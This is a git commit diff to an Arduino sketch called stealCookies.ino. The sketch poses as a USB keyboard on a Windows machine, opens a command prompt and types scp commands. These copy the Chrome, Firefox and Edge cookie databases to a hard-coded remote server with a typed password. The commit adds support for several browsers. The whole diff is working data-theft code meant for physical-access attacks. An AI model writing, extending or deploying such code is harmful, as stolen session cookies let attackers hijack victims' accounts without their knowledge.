18e5388220bb4e9b316e2c8fa635ed167b1c747a
Mar0dev <wwmarek@wp.pl>
2023-05-14 22:09:56 +0200

    added variety for different browsers

--- stealCookies.ino
+++ stealCookies.ino
@@ -8,14 +8,35 @@ const char* server_ip = "192.168.8.124";
 // choose desired browsers
 bool chrome = 1;
 bool firefox = 0;
-bool edge = 0;
-// first time using this PC or server (will accept fingerprints in cmd)
-bool firstTime = 0;
+bool edge = 1;
 
 void setup() {
   //initialize keyboard
   Keyboard.begin();
+  //enter folder with chrome cookies
+  if (chrome == 1)
+  {
+    String path = "\"C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" ";
+    copyCookies(path);
+  };
   delay(2000);
+  if (firefox == 1)
+  {
+    String path = "\"C:\\Users\%username%\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*-release\\cookies.sqlite\" ";
+    copyCookies(path);
+  };
+  delay(2000);
+  if (edge == 1)
+  {
+    String path = "\"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies\" ";
+    copyCookies(path);
+  };
+  delay(2000);
+  
+  Keyboard.end();
+}
+
+void copyCookies(String path){
   //access CMD
   Keyboard.press(KEY_LEFT_GUI);
   delay(500);
@@ -26,28 +47,28 @@ void setup() {
   Keyboard.press('m');
   delay(500);
   Keyboard.press('d');
-  delay(500);
+  delay(300);
   Keyboard.release('c');
-  delay(500);
+  delay(300);
   Keyboard.release('m');
-  delay(500);
+  delay(300);
   Keyboard.release('d');
   delay(1000);
   Keyboard.press(KEY_RETURN);
   delay(500);
   Keyboard.release(KEY_RETURN);
   delay(500);
-  //enter folder with chrome cookies
-  String path = "\"C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" ";
+  //create command
   String copyCommand = "scp " + path + String(server_user) + "@" + String(server_ip) + ":" + String(server_path);
   Keyboard.println(copyCommand);
-  delay(1000);
+  delay(500);
   Keyboard.println(server_password);
-  delay(1000);
+  delay(3000);
   //end keystrokes
-  delay(400);
-  Keyboard.end();
+  Keyboard.println("exit");
+  delay(1000);
 }
+
 void loop()
 {
 }
